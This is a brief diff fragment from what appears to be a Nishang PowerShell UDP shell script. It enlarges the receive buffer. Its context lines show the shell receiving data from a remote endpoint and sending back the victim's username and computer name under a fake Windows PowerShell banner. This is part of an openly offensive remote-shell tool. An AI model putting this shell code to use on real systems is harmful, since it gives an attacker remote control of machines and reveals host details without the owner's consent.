@@ -99,7 +99,7 @@ https://github.com/samratashok/nishang
             $client.Receive([ref]$endpoint)
         }
 
-        [byte[]]$bytes = 0..255|%{0}
+        [byte[]]$bytes = 0..65535|%{0}
 
         #Send back current username and computername
         $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
